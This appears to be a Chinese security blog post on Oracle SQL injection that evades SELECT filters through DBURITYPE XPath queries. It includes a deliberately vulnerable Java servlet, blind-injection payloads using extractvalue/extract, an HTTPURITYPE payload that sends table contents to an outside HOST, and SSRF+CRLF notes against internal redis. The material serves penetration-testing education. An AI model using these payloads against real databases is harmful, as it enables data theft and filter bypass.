    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/Web/">Web</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2019/11/24/ORACLE-无SELECT注入/"><span>ORACLE 无SELECT注入</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/11/24/ORACLE-无SELECT注入/" rel="bookmark">
        <time class="entry-date published" datetime="2019-11-24T10:43:37.000Z">
          2019-11-24
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>在实际测试中, 经常遇到一出现SELECT就被拦截的场景, 对于无法多行查询的注入来说,一般遇到这种场景就告别出数据了(能出个user等信息)。闲着读ORACLE文档的时候, 发现ORACLE支持使用Xpath进行查询, 通过使用Xpath可以实现无SELECT查询数据。</p>
<h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p><a target="_blank" rel="noopener" href="https://docs.oracle.com/cd/B10501_01/appdev.920/a96616/arxml35.htm#1004694">https://docs.oracle.com/cd/B10501_01/appdev.920/a96616/arxml35.htm#1004694</a></p>
<blockquote>
<p>Description of DBUriType<br>The DBUriType is a subtype of the UriType that provides support for of DBUri-refs. A DBUri-ref is an intra-database URL that can be used to reference any row or row-column data in the database. The URL is specified as an XPath expression over a XML visualization of the database. The schemas become elements which contain tables and views. These tables and view further contain the rows and columns inside them.</p>
</blockquote>
<p>从文档中可以看出DBUriType支持使用XPath表达式查询数据库中的数据。<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/ora_1.jpg" alt="-w724"></p>
<p>从上图中能够看出虚拟视图的结构,很容易的能够看出uri的格式为/oradb/schemaname/tablename/ROW[predicate_expression],oradb可省略(也支持查询视图)。</p>
<p>正常查询结果。<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/ora_2.jpg" alt="-w319"></p>
<p>使用DBURITYPE查询结果。<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/ora_3.jpg" alt="-w338"></p>
<p>本地用JDBC简单搭建个非dba ORACLE SQL注入环境。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">String username = req.getParameter(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">resp.setHeader(<span class="string">&quot;Content-type&quot;</span>, <span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line">resp.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    Class.forName(<span class="string">&quot;oracle.jdbc.driver.OracleDriver&quot;</span>);</span><br><span class="line">    Connection conn = DriverManager.getConnection(<span class="string">&quot;jdbc:oracle:thin:@39.108.232.59:49161:xe&quot;</span>, <span class="string">&quot;system&quot;</span>, <span class="string">&quot;oracle&quot;</span>);</span><br><span class="line">    Statement sts = conn.createStatement();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(username.toLowerCase().contains(<span class="string">&quot;select&quot;</span>))&#123;</span><br><span class="line">        resp.getWriter().print(<span class="string">&quot;含有非法字符&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(String.format(<span class="string">&quot;select count(*) from HR.test where username = &#x27;%s&#x27;&quot;</span>, username));</span><br><span class="line">    ResultSet rs = sts.executeQuery(String.format(<span class="string">&quot;select count(*) from HR.test where username = &#x27;%s&#x27;&quot;</span>, username));</span><br><span class="line">    rs.next();</span><br><span class="line">    <span class="keyword">int</span> row = rs.getInt(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(row &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        resp.getWriter().print(<span class="string">&quot;已注册&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        resp.getWriter().print(<span class="string">&quot;未注册&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>/oradb/schemaname/tablename/ROW[predicate_expression]</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select DBURITYPE(&#39;&#x2F;HR&#x2F;TEST&#x2F;ROW[USERNAME&#x3D;&quot;admin&quot;]&#x2F;USERNAME&#39;).getxml() from dual </span><br></pre></td></tr></table></figure>
<p>在测试盲注时, 我没能在predicate_expression中实现模糊查询或者通配, 大概翻了下文档也没找到,只能够进行完整的匹配,不能模糊查询或者通配基本没法盲注。<br>所以在这里换成了使用extractvalue解析查询出来的xml再进行盲注。<br>/checkUsername?username=admin’ and extractvalue(DBURITYPE(‘/HR/TEST’).getxml(),’/TEST/ROW[1]/PASSWORD’)like’admin%25’–<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/ora_4.jpg" alt="-w984"></p>
<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/ora_5.jpg" alt="-w1011"></p>
<p>能够实现盲注, extractvalue容易被拦,可以换成extract进行盲注,需要查询第二行时修改为ROW[2]即可查询。<br>使用extract盲注时, 需注意查询出的xml结果会带有列名<code>&lt;PASSWORD&gt;admin&lt;/PASSWORD&gt;</code>。</p>
<h3 id="OOB"><a href="#OOB" class="headerlink" title="OOB"></a>OOB</h3><p>oracle本身能够很容易的外带数据, 在能够发送HTTP请求出网时就不再需要盲注,这里直接使用httpuritype外带出dburitype查询出的数据。</p>
<p>/checkUsername?username=a’ and HTTPURITYPE(‘<a target="_blank" rel="noopener" href="http://host/&#39;||">http://HOST/&#39;||</a> DBURITYPE(‘/HR/TEST’).getxml()).getcontenttype() is null–</p>
<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/ora_6.jpg" alt="-w1400"><br>外带出了表中的所有数据, 在表中数据数量过于庞大时发送GET请求可能会出现问题。可以使用上面的extract外带一行数据等方法。<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/ora_7.jpg" alt="-w902"></p>
<h3 id="SSRF-CRLF"><a href="#SSRF-CRLF" class="headerlink" title="SSRF + CRLF"></a>SSRF + CRLF</h3><p>使用httpuritype发送HTTP请求存在CRLF问题, 在存在注入无法RCE时可以尝试打内网的redis等。<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/ora_8.jpg" alt="-w1231"></p>
<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a target="_blank" rel="noopener" href="https://docs.oracle.com/cd/B10501_01/appdev.920/a96616/arxml35.htm#1004694">https://docs.oracle.com/cd/B10501_01/appdev.920/a96616/arxml35.htm#1004694</a><br><a target="_blank" rel="noopener" href="https://docs.oracle.com/cd/B12037_01/appdev.101/b10790/xdb15dbu.htm#i1032143">https://docs.oracle.com/cd/B12037_01/appdev.101/b10790/xdb15dbu.htm#i1032143</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/WEB/">WEB</a>
    </span>
    

    </div>

    
  </div>
</article>




<nav class="pagination">
  
  
  <a href="/page/2/" class="pagination-next">Next</a>
  
</nav>
    </main>

    <footer class="site-footer">
  <p class="site-info">
    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
    </br>
    
    &copy; 2021 雨了个雨
    
  </p>
</footer>
    
    
  </div>
</div>
</body>
</html>